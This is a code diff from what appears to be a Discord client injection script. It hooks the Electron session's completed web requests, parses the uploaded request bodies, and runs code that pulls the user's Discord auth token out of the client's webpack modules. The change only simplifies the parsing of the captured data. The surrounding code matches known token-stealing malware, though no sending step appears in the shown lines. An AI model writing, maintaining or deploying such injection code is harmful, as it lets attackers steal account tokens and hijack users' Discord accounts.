@@ -632,13 +632,9 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsedData = details.uploadData[0].bytes;
-  let data;
-  try {
-    data = JSON.parse(Buffer.from(unparsedData).toString());
-  } catch (SyntaxError) {
-    data = JSON.parse(JSON.stringify(Buffer.from(unparsedData).toString()));
-  }
+  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+  const data = JSON.parse(unparsed_data);
+
   const token = await execScript(
     `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
   );
